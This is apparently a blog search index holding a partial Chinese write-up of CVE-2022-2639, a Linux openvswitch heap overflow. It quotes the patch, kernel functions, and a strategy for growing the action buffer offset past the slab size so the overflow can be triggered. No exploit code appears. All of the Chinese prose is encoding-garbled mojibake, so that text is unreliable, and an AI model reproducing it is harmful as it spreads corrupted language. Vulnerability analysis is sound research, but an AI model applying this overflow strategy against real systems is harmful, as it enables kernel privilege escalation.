<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CVE-2022-0185çš„ä¸‰ç§è§£æ³•(ä¸‰)</title>
    <url>/2022/12/05/CVE-2022-0185%E7%9A%84%E4%B8%89%E7%A7%8D%E8%A7%A3%E6%B3%95-%E4%B8%89/</url>
    <content><![CDATA[<p>Pipe_primitive ä¸ CVE-2022-0185 File System Context æ•´æ•°æº¢å‡ºæ¼æ´åˆ©ç”¨ã€‚</p>
<span id="more"></span>
]]></content>
      <categories>
        <category>cve å¤ç°</category>
      </categories>
      <tags>
        <tag>kernel</tag>
        <tag>cve</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2022-0185çš„ä¸‰ç§è§£æ³•(äºŒ)</title>
    <url>/2022/12/05/CVE-2022-0185%E7%9A%84%E4%B8%89%E7%A7%8D%E8%A7%A3%E6%B3%95-%E4%BA%8C/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>CVE-2022-0185çš„ä¸‰ç§è§£æ³•(ä¸€)</title>
    <url>/2022/12/05/CVE-2022-0185%E7%9A%84%E4%B8%89%E7%A7%8D%E8%A7%A3%E6%B3%95-%E4%B8%80/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>CVE-2022-2639</title>
    <url>/2022/12/02/CVE-2022-2639/</url>
    <content><![CDATA[<p>cve-2022-2639 openvswitch æ¨¡å— kmalloc-0x10000 å †æº¢å‡ºã€ç»“åˆ Pipe_Primitiveåˆ©ç”¨ã€‚</p>
<span id="more"></span>

<h1 id="æºç é˜…è¯»"><a href="#æºç é˜…è¯»" class="headerlink" title="æºç é˜…è¯»"></a>æºç é˜…è¯»</h1><p>æ•´ä½“æºç å¯ä»¥ç”¨ si è½½å…¥ï¼Œä¸¤è¾¹åŒæ—¶çœ‹æ•´ä½“é€»è¾‘å’Œå‡½æ•°å®ç°æ¯”è¾ƒæ–¹ä¾¿ã€‚ç„¶åadd allï¼Œè¿™æ—¶å€™åªéœ€è¦addç¬¬ä¸€å±‚å°±è¡Œäº†ï¼Œä¸è¦é€‰ä¸‹é¢çš„ï¼Œå¦åˆ™ si å°±ä¼šå› ä¸ºæºä»£ç è¿‡å¤šè€Œåˆ†æä¸äº†å¯„æ‰ã€‚</p>
<p><img src="/img/CVE-2022-2639/1.png" alt="image"></p>
<p>ç„¶åæ ¹æ®æƒ³è¦é˜…è¯»çš„ä½ç½®ï¼Œé€‰æ‹©é‚£ä¸ªå¯¹åº”çš„å°æ–‡ä»¶å¤¹ï¼Œç„¶åé€’å½’çš„addæ‰€æœ‰æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢çš„ç¬¬äºŒä¸ªå¯¹å·è¦æ‰“ä¸Šã€‚å¦‚æœç¢°åˆ°æ‰¾ä¸åˆ°çš„ç»“æ„ä½“æˆ–è€…å…¶ä»–å®šä¹‰ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªåœ¨çº¿çš„ source æ‰¾åˆ°å¯¹åº”å…³ç³»ï¼Œç„¶åå†å›åˆ° si ä¸­ add è¯¥è·¯å¾„ä¸‹çš„æ–‡ä»¶ã€‚è¿™æ ·åœ¨ si ä¸­å°±èƒ½æ‰¾åˆ°äº†ã€‚å¦‚ï¼š <a href="https://elixir.bootlin.com/linux/v5.13/C/ident/nlattr">nlattr</a> ã€‚</p>
<p>æ‰¾åˆ°å®šä¹‰çš„ nlattrï¼š</p>
<p><img src="/img/CVE-2022-2639/2.png" alt="nlattr"></p>
<h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><p>æŸ¥çœ‹ patch:</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="comment">diff --git a/net/openvswitch/flow_netlink.c b/net/openvswitch/flow_netlink.c</span></span><br><span class="line"><span class="comment">index 7176156d38443c..4c09cf8a0ab2dc 100644</span></span><br><span class="line"><span class="comment">--- a/net/openvswitch/flow_netlink.c</span></span><br><span class="line"><span class="comment">+++ b/net/openvswitch/flow_netlink.c</span></span><br><span class="line"><span class="meta">@@ -2465,7 +2465,7 @@</span> static struct nlattr *reserve_sfa_size(struct sw_flow_actions **sfa,</span><br><span class="line"> 	new_acts_size = max(next_offset + req_size, ksize(*sfa) * 2);</span><br><span class="line"> </span><br><span class="line"> 	if (new_acts_size &gt; MAX_ACTIONS_BUFSIZE) &#123;</span><br><span class="line"><span class="deletion">-		if ((MAX_ACTIONS_BUFSIZE - next_offset) &lt; req_size) &#123;</span></span><br><span class="line"><span class="addition">+		if ((next_offset + req_size) &gt; MAX_ACTIONS_BUFSIZE) &#123;</span></span><br><span class="line"> 			OVS_NLERR(log, &quot;Flow action size exceeds max %u&quot;,</span><br><span class="line"> 				  MAX_ACTIONS_BUFSIZE);</span><br><span class="line"> 			return ERR_PTR(-EMSGSIZE);</span><br></pre></td></tr></table></figure>



<h2 id="reserve-sfa-size"><a href="#reserve-sfa-size" class="headerlink" title="reserve_sfa_size"></a>reserve_sfa_size</h2><p>æ‰¾åˆ°å¯¹åº”å‡½æ•°ï¼Œçœ‹ä¸€ä¸‹æ¼æ´æˆå› ï¼š</p>
<p><img src="/img/CVE-2022-2639/3.png" alt="3"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ACTIONS_BUFSIZE	(32 * 1024)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> next_offset = offsetof(<span class="keyword">struct</span> sw_flow_actions, actions) + (*sfa)-&gt;actions_len;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> req_size = NLA_ALIGN(attr_len);</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥æ³¨æ„åˆ°å›¾ä¸­çº¢è‰²æ¡†å†…ä»£ç ä¸­ï¼Œç­‰å¼å·¦è¾¹ <code>next_offset</code> ä¸ºæœ‰ç¬¦å·æ•°ï¼Œè€Œå³è¾¹çš„ <code>req_size</code> ä¸ºæ— ç¬¦å·æ•°ã€‚å·¦ä¾§ç›¸å‡åå¦‚æœç»“æœä¸ºè´Ÿæ•°ï¼Œ<strong>åˆ™åœ¨ä¸æ— ç¬¦å·æ¯”è¾ƒæ—¶ä¼šè¢«å¼ºåˆ¶è½¬æ¢ä¸ºæ— ç¬¦å·æ•°è€Œå˜æˆéå¸¸å¤§çš„æ­£æ•°</strong>ï¼Œä»è€Œç»•è¿‡ä¸‹é¢çš„ exceeds çš„ check ç»§ç»­ä¸‹é¢çš„é€»è¾‘ã€‚</p>
<p><code>MAX_ACTIONS_BUFSIZE</code> ä¸º 0x8000ï¼Œæ‰€ä»¥å½“ <code>next_offset</code> çš„å€¼å¤§äºè¯¥å€¼æ—¶ï¼Œå°±ä¼šå‘ç”Ÿå‰é¢æåˆ°çš„æƒ…å†µã€‚</p>
<p>ç»§ç»­å‘ä¸‹åˆ†æã€‚</p>
<p>â‘  <code>new_acts_size</code> &#x3D; <code>MAX_ACTIONS_BUFSIZE</code>	&#x3D; 0x8000ï¼Œ2362è¡Œæ ¹æ®è¯¥ size è¿›è¡Œ <code>alloc</code>ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> sw_flow_actions *<span class="title function_">nla_alloc_flow_actions</span><span class="params">(<span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sw_flow_actions</span> *<span class="title">sfa</span>;</span></span><br><span class="line"></span><br><span class="line">	WARN_ON_ONCE(size &gt; MAX_ACTIONS_BUFSIZE);</span><br><span class="line"></span><br><span class="line">	sfa = kmalloc(<span class="keyword">sizeof</span>(*sfa) + size, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!sfa)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">	sfa-&gt;actions_len = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> sfa;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sw_flow_actions</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">	<span class="type">size_t</span> orig_len;	<span class="comment">/* From flow_cmd_new netlink actions size */</span></span><br><span class="line">	u32 actions_len;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> <span class="title">actions</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">sizeof</span>(<span class="keyword">struct</span> sw_flow_actions) = <span class="number">0x20</span></span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆ <code>kmalloc</code> å¤§å°ä¸º <code>sw_flow_actions</code> ç»“æ„ä½“çš„å¤§å°ä¸ <code>new_acts_size</code> çš„å’Œï¼›<br>â‘¡ å›åˆ°æ¼æ´å‡½æ•°ï¼Œå°†ä¼ å…¥çš„ <code>sfa-&gt;actions</code> å¤„çš„å†…å®¹å¤åˆ¶åˆ°æ–°ç”³è¯·çš„ <code>acts-&gt;actions</code> å¤„ï¼›<br>â‘¢ ç»è¿‡ä¸€äº›å¯¹ <code>acts</code> çš„åˆå§‹åŒ–ï¼Œè¿”å› <code>acts+next_offset</code>ã€‚</p>
<h2 id="copy-action"><a href="#copy-action" class="headerlink" title="copy_action"></a>copy_action</h2><p>é€šè¿‡ si çš„ Relationï¼Œä¹Ÿèƒ½çœ‹åˆ°è°ƒç”¨å…³ç³»ï¼š</p>
<p><img src="/img/CVE-2022-2639/4.png"></p>
<p><code>copy_action</code> å‡½æ•°ä¸­ï¼š</p>
<p><img src="/img/CVE-2022-2639/5.png"></p>
<p>è¿”å›å€¼ <code>to</code> å³ä¸º <code>acts + next_offset</code>ï¼Œè€Œ <code>acts</code> çš„æ•´ä¸ªå¤§å°æ‰ä¸º 0x8000+0x20ï¼Œæ‰€ä»¥ä¸‹é¢çš„ <code>memcpy</code> å³å‘ç”Ÿäº†å †è¶Šç•Œå†™ã€‚ </p>
<p>ä½†æ˜¯ç”±äºå¯¹é½ï¼Œå†…æ ¸å¹¶ä¸ä¼šåˆ†é… 0x8020 å¤§å°çš„ slabï¼Œè€Œæ˜¯åˆ†é…äº† 0x10000 çš„ slabã€‚ </p>
<p>æ ¹æ®å‚è€ƒæ–‡ç« ä¸­çš„æè¿°ï¼Œopenvswitch é€šè¿‡ netlink è¿›è¡Œé€šä¿¡ï¼ˆçœ‹æºç ç›®å½•å’Œæ–‡ä»¶åä¹Ÿæœ‰å‘ç°ï¼‰ã€‚æ ¹æ® man pages çš„æè¿°ï¼š</p>
<blockquote>
<p>Netlink is used to transfer information between the kernel and user-space processes.  It consists of a standard sockets-based interface for user space processes and an internal kernel API for kernel modules.</p>
</blockquote>
<p>æœ€åˆå¼€å‘æ˜¯ä¸ºäº†å…‹æœ ioctl çš„é™åˆ¶ã€‚ä¾‹å¦‚ï¼Œå†…æ ¸å¯ä»¥ä½¿ç”¨ netlink æ¥æ”¶å˜é•¿çš„å‚æ•°ã€‚å‡ ä¹æ‰€æœ‰ Linux ç½‘ç»œç®¡ç†éƒ½ä½¿ç”¨äº† netlinkï¼Œä¾‹å¦‚ iproute2 ä¸­çš„ip &#x2F; ss &#x2F; bridgeã€‚æ›´å¤šå…³äº Netlink çš„ä¸œè¥¿åç»­æ•´ç†å¥½ CVE-2022-1015 çš„åšå®¢åç›´æ¥æŒ‚ä¸ªé“¾æ¥è¿‡å»~~</p>
<p>è¿™ä¹‹ä¸­ç”¨åˆ°äº†åä¸º <code>nlattr</code> çš„ç»“æ„ä½“ï¼š</p>
<p><img src="/img/CVE-2022-2639/6.png"></p>
<p>è¯¥ç»“æ„ä½“å¤§å°ä¸º4å­—èŠ‚ã€‚len å­—æ®µä¸º <code>u16</code>ï¼Œä¹Ÿå°±æ˜¯æ­¤æ—¶ <code>nla_len</code> æœ€å¤§ä¸º 0xffffï¼Œ<code>memcpy</code> çš„ç¬¬äºŒä¸ªå‚æ•° <code>from</code> çš„ <code>payload</code> æœ€å¤šå°±æ˜¯ 0xffff å­—èŠ‚ã€‚è€Œå‰é¢çš„ <code>kmalloc</code> çš„ slab ä¸º 0x10000ã€‚å¹¶ä¸èƒ½ç›´æ¥ oob writeã€‚</p>
<p>ä¸Šé¢æåˆ° openvswitch æ¨¡å—ä½¿ç”¨ netlink é€šä¿¡ï¼Œé‚£ä¸€å®šä¼šå…ˆéµå®ˆ netlink çš„é€šä¿¡çº¦å®šï¼ˆä¹Ÿå°±æ˜¯ä¸€äº›æ•°æ®ç»“æ„çš„ä½¿ç”¨ï¼‰ï¼Œå³ netlink çš„æ¶ˆæ¯å¤´ï¼š<code>nlmsghdr</code>ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> &#123;</span></span><br><span class="line">	__u32		nlmsg_len;	<span class="comment">// æ•´ä¸ªæ¶ˆæ¯çš„é•¿åº¦, åŒ…æ‹¬ Netlink æ¶ˆæ¯å¤´æœ¬èº«</span></span><br><span class="line">	__u16		nlmsg_type;	<span class="comment">// ç‰¹å®šæ¥å£çš„æ¶ˆæ¯ç±»å‹</span></span><br><span class="line">	__u16		nlmsg_flags;<span class="comment">// æ¶ˆæ¯ç±»å‹çš„é¢å¤–ä¿¡æ¯</span></span><br><span class="line">	__u32		nlmsg_seq;	<span class="comment">/* Sequence number */</span></span><br><span class="line">	__u32		nlmsg_pid;	<span class="comment">/* Sending process port ID */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><img src="/img/CVE-2022-2639/7.png"></p>
<p>netlink åˆæœ‰å¾ˆå¤šç§ç±»ï¼Œåœ¨ netlink.h ä¸­ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_ROUTE		0	<span class="comment">/* Routing/device hook				*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_UNUSED		1	<span class="comment">/* Unused number				*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_USERSOCK	2	<span class="comment">/* Reserved for user mode socket protocols 	*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_FIREWALL	3	<span class="comment">/* Unused number, formerly ip_queue		*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_SOCK_DIAG	4	<span class="comment">/* socket monitoring				*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_NFLOG		5	<span class="comment">/* netfilter/iptables ULOG */</span></span></span><br><span class="line">......</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_IP6_FW		13</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_DNRTMSG		14	<span class="comment">/* DECnet routing messages */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_KOBJECT_UEVENT	15	<span class="comment">/* Kernel messages to userspace */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_GENERIC		16</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>openvswitch å±äº <code>NETLINK_GENERIC</code>ã€‚å› æ­¤åœ¨ <code>struct nlmsghdr</code> ä¸­è¿˜éœ€è¦ <code>struct genlmsghdr</code>ï¼›åœ¨è¿™åé¢æ‰æ˜¯çœŸæ­£ä¼ é€’ç»™ openvswitch çš„æ•°æ®ï¼Œä¹Ÿå°±æ˜¯ <code>struct nlattr</code>ã€‚<strong>å³ <code>struct nlmsghdr -&gt; struct genlmsghdr -&gt; struct nlattr</code> ä¸‰å±‚æ•°æ®ç»“æ„</strong>ã€‚å‰é¢çš„æ¼æ´ä½äºæ‹·è´ flow actions çš„åœºæ™¯ä¸­ï¼Œè€Œ flow actions åˆæ˜¯ä¸» <code>struct nlattr</code>ä¸­çš„ä¸€ä¸ªå­ <code>struct nlattr</code>ã€‚æ‰€ä»¥å±‚å±‚åµŒå¥—ä¸‹æ¥ï¼Œæœ€å¤–å±‚çš„ <code>nlattr</code> çš„é•¿åº¦éƒ½ä¸è¶…è¿‡ 0xffffï¼Œåé¢çš„å­ <code>nlattr</code> æ›´ä¸èƒ½è¾¾åˆ°æº¢å‡º 0x10000 çš„è¦æ±‚ã€‚</p>
<h2 id="ovs-nla-copy-actions"><a href="#ovs-nla-copy-actions" class="headerlink" title="__ovs_nla_copy_actions"></a>__ovs_nla_copy_actions</h2><p>ç»§ç»­çœ‹ <code>copy_action</code> çš„ä¸Šå±‚å‡½æ•° <code>__ovs_nla_copy_actions</code>ï¼š</p>
<p><img src="/img/CVE-2022-2639/8.png"></p>
<p>å…¶ä¸­æœ‰å¦‚ä¸‹æ•°ç»„æ¥æè¿°æ¯ä¸ª <code>ACTION attr</code> çš„é•¿åº¦ï¼š</p>
<p><img src="/img/CVE-2022-2639/9.png"></p>
<p>æ ¹æ®æ³¨é‡Šï¼Œ -1 è¡¨ç¤ºå˜é•¿ï¼Œå…¶ä»–ç›´æ¥èµ‹å€¼çš„è‡ªç„¶å°±æ˜¯å®šé•¿çš„äº†ã€‚å¯¹äºå®šé•¿çš„ <code>ACTION</code>ï¼Œä¾‹å¦‚ä»£ç ä¸­çš„ <code>OVS_ACTION_ATTR_PUSH_MPLSã€OVS_ACTION_ATTR_PUSH_VLAN</code> ç­‰ï¼Œåªè¿›è¡Œäº†ä¸€äº›ç®€å•çš„å­—æ®µåˆ¤æ–­å°±è·³å‡º switchï¼Œè¿›å…¥åˆ° <code>copy_action</code> ä¸­ï¼š</p>
<p><img src="/img/CVE-2022-2639/10.png"></p>
<p><img src="/img/CVE-2022-2639/11.png"></p>
<p>æ³¨æ„åˆ°è¿™é‡Œæœ‰ä¸€ä¸ªéå¸¸é‡è¦çš„æ ‡è¯†ï¼š<code>skip_copy</code>ï¼Œä»–åœ¨è¿›å…¥æ•´ä¸ª switch ä¹‹å‰è¢«èµ‹å€¼ä¸º <code>false</code>ã€‚è€Œåœ¨ä¸Šè¿°å¯¹å¦‚<code>OVS_ACTION_ATTR_PUSH_MPLS</code> ç­‰å®šé•¿ <code>ACTION</code> çš„å¤„ç†ä¸­ï¼Œå¹¶æœªä¿®æ”¹è¯¥å€¼ã€‚è€Œåœ¨å¤„ç†å…¶ä»–èµ‹å€¼ä¸º -1 å³å˜é•¿çš„<code>ACTION</code>ä¸­ï¼Œä¼šå°†å…¶èµ‹å€¼ä¸º <code>true</code>ï¼š</p>
<p><img src="/img/CVE-2022-2639/12.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ovs_ct_copy_action</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="type">const</span> <span class="keyword">struct</span> nlattr *attr,</span></span><br><span class="line"><span class="params">		       <span class="type">const</span> <span class="keyword">struct</span> sw_flow_key *key,</span></span><br><span class="line"><span class="params">		       <span class="keyword">struct</span> sw_flow_actions **sfa,  <span class="type">bool</span> <span class="built_in">log</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ovs_conntrack_info</span> <span class="title">ct_info</span>;</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *helper = <span class="literal">NULL</span>;</span><br><span class="line">	u16 family;</span><br><span class="line">	<span class="type">int</span> err;</span><br><span class="line">	Â·Â·Â·</span><br><span class="line">	err = parse_ct(attr, &amp;ct_info, &amp;helper, <span class="built_in">log</span>);</span><br><span class="line">	Â·Â·Â·</span><br><span class="line">	err = ovs_nla_add_action(sfa, OVS_ACTION_ATTR_CT, &amp;ct_info,<span class="keyword">sizeof</span>(ct_info), <span class="built_in">log</span>);</span><br><span class="line">	Â·Â·Â·</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨ <code>ovs_ct_copy_action</code> ä¸­ï¼Œ<code>parse_ct</code> ä¸­åªéœ€è¦ 8 å­—èŠ‚å°±èƒ½æ„é€ åˆæ³•çš„ <code>nlattr</code>ï¼ˆæˆ–è€…æ›´å°‘ï¼Ÿä¸ç¡®å®šï¼‰ã€‚è€Œåœ¨ä¸‹é¢çš„ <code>ovs_nla_add_action</code> ä¸­ï¼Œ<code>add_action</code> ä¼ å…¥çš„ç»“æ„ä½“ <code>data</code> å’Œ <code>len</code> åˆ†åˆ«æ˜¯ <code>ovs_conntrack_info</code> å’Œè¯¥ç»“æ„ä½“çš„é•¿åº¦ï¼š</p>
<p><img src="/img/CVE-2022-2639/13.png"></p>
<p><img src="/img/CVE-2022-2639/14.png"></p>
<p>è€Œåœ¨ kernel 5.13 ä¸­è¯¥ç»“æ„ä½“å¤§å°ä¸º 0xa0ï¼š</p>
<p><img src="/img/CVE-2022-2639/15.png"></p>
<p>ä¹Ÿå°±æ˜¯è¯´å½“æˆ‘ä»¬æ·»åŠ 500ä¸ª <code>OVS_ACTION_ATTR_CT</code> çš„ <code>nlattr</code>ï¼Œé‚£åªç”¨äº† 500*8 &#x3D; 0xFA0 å­—èŠ‚çš„ <code>nlattr</code> é•¿åº¦ï¼Œå´è®©æˆ‘ä»¬æœ€å‰é¢æåˆ°çš„ buffer çš„ <code>next_offset</code> æˆåŠŸå¢åŠ äº† 0x500*0xa0 &#x3D; 0x13880 ä¸ªå­—èŠ‚ã€‚å¯ä»¥è§¦å‘æº¢å‡ºã€‚ä½†æ˜¯ä½¿ç”¨ <code>ovs_conntrack_info</code> æœ‰ä¸ªå±€é™æ€§ï¼Œå°±æ˜¯è¿™ä¸ªç»“æ„ä½“åœ¨å†…æ ¸ç‰ˆæœ¬çš„æ›´è¿­ä¸­è¢«ä¿®æ”¹è¿‡å¤šæ¬¡ï¼Œå¯¼è‡´åœ¨ä¸åŒç‰ˆæœ¬çš„å†…æ ¸å…¶å¤§å°å¹¶ä¸å›ºå®šã€‚<strong>è™½ç„¶ä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼Œä½†è‡³å°‘æä¾›äº†ä¸€ä¸ªæ€è·¯ï¼šé€šè¿‡ <code>add_action</code> å°† <code>next_offset</code> æŒ‡é’ˆå‘åç§»åŠ¨ï¼Œä½¿å…¶çªç ´ 0xffff çš„é™åˆ¶ã€‚</strong></p>
<p>æ‰€ä»¥ä¸ºäº†é¿å…ä¸é€šç”¨çš„æƒ…å†µï¼Œå†å¯»æ‰¾æœ‰æ²¡æœ‰å…¶ä»–å¯ç”¨çš„ <code>ACTION_ATTR</code>ï¼ˆæ¯•ç«Ÿé‚£ä¹ˆå¤šå‘¢ï¼‰ã€‚å¯ä»¥æ‰¾åˆ°<code>OVS_ACTION_ATTR_SET</code>ï¼š</p>
<p><img src="/img/CVE-2022-2639/16.png"></p>
<p>åœ¨ case ä¸­å¹¶æœªå¯¹å…³é”®çš„ <code>skip_copy</code> è¿›è¡Œå¤„ç†ï¼Œä½†æ˜¯å°†å…¶ä¼ å…¥äº†è°ƒç”¨çš„å‡½æ•°ä¸­ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">validate_set</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> nlattr *a,</span></span><br><span class="line"><span class="params">			<span class="type">const</span> <span class="keyword">struct</span> sw_flow_key *flow_key,</span></span><br><span class="line"><span class="params">			<span class="keyword">struct</span> sw_flow_actions **sfa, <span class="type">bool</span> *skip_copy,</span></span><br><span class="line"><span class="params">			u8 mac_proto, __be16 eth_type, <span class="type">bool</span> masked, <span class="type">bool</span> <span class="built_in">log</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">ovs_key</span> =</span> nla_data(a);</span><br><span class="line">	<span class="type">int</span> key_type = nla_type(ovs_key);</span><br><span class="line">	<span class="type">size_t</span> key_len;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* There can be only one key in a action */</span></span><br><span class="line">	<span class="keyword">if</span> (nla_total_size(nla_len(ovs_key)) != nla_len(a))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	key_len = nla_len(ovs_key);</span><br><span class="line">	<span class="comment">// ä¼ å…¥ masked ä¸º false</span></span><br><span class="line">	<span class="keyword">if</span> (masked)</span><br><span class="line">		key_len /= <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (key_type &gt; OVS_KEY_ATTR_MAX ||</span><br><span class="line">		<span class="comment">// æ³¨æ„è¿™é‡Œæœ‰ä¸€ä¸ªå¯¹ key_len çš„æ£€æŸ¥</span></span><br><span class="line">	    !check_attr_len(key_len, ovs_key_lens[key_type].len))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (masked &amp;&amp; !validate_masked(nla_data(ovs_key), key_len))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (key_type) &#123;</span><br><span class="line">	Â·Â·Â·</span><br><span class="line">	<span class="comment">// å¯¹è¯¥ type çš„æ£€æŸ¥éå¸¸ç®€å•</span></span><br><span class="line">	<span class="keyword">case</span> OVS_KEY_ATTR_ETHERNET:</span><br><span class="line">		<span class="keyword">if</span> (mac_proto != MAC_PROTO_ETHERNET)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	Â·Â·Â·</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Convert non-masked non-tunnel set actions to masked set actions. */</span></span><br><span class="line">	<span class="keyword">if</span> (!masked &amp;&amp; key_type != OVS_KEY_ATTR_TUNNEL) &#123;</span><br><span class="line">            <span class="comment">// ï¼ï¼ï¼ æ³¨æ„æ­¤æ—¶çš„ len = key_len * 2</span></span><br><span class="line">            <span class="type">int</span> start, len = key_len * <span class="number">2</span>;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">at</span>;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// ï¼ï¼ï¼</span></span><br><span class="line">            *skip_copy = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">            start = add_nested_action_start(sfa,</span><br><span class="line">                                            OVS_ACTION_ATTR_SET_TO_MASKED,</span><br><span class="line">                                            <span class="built_in">log</span>);</span><br><span class="line">            <span class="keyword">if</span> (start &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> start;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è°ƒç”¨__add_actionï¼Œä¼ å…¥çš„lenä¸ºkey_lenä¸¤å€</span></span><br><span class="line">            at = __add_action(sfa, key_type, <span class="literal">NULL</span>, len, <span class="built_in">log</span>);</span><br><span class="line">            <span class="keyword">if</span> (IS_ERR(at))</span><br><span class="line">                <span class="keyword">return</span> PTR_ERR(at);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">memcpy</span>(nla_data(at), nla_data(ovs_key), key_len); <span class="comment">/* Key. */</span></span><br><span class="line">            <span class="built_in">memset</span>(nla_data(at) + key_len, <span class="number">0xff</span>, key_len);    <span class="comment">/* Mask. */</span></span><br><span class="line">            <span class="comment">/* Clear non-writeable bits from otherwise writeable fields. */</span></span><br><span class="line">            <span class="keyword">if</span> (key_type == OVS_KEY_ATTR_IPV6) &#123;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">ovs_key_ipv6</span> *<span class="title">mask</span> =</span> nla_data(at) + key_len;</span><br><span class="line"></span><br><span class="line">                mask-&gt;ipv6_label &amp;= htonl(<span class="number">0x000FFFFF</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            add_nested_action_end(*sfa, start);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‡è®¾æˆ‘ä»¬å†…éƒ¨åµŒå¥—çš„ <code>nlattr type</code>ä¸º <code>OVS_KEY_ATTR_ETHERNET</code>ï¼Œé¦–å…ˆè¦é€šè¿‡å‰é¢æåˆ°çš„ <code>key_len</code> çš„æ£€æŸ¥ï¼Œå³ <code>key_len</code> ç­‰äº sizeof(struct ovs_key_ethernet) &#x3D; 1*2*6 &#x3D; 0x0Cï¼š</p>
<p><img src="/img/CVE-2022-2639/17.png"></p>
<p><img src="/img/CVE-2022-2639/18.png"></p>
<p><img src="/img/CVE-2022-2639/19.png"></p>
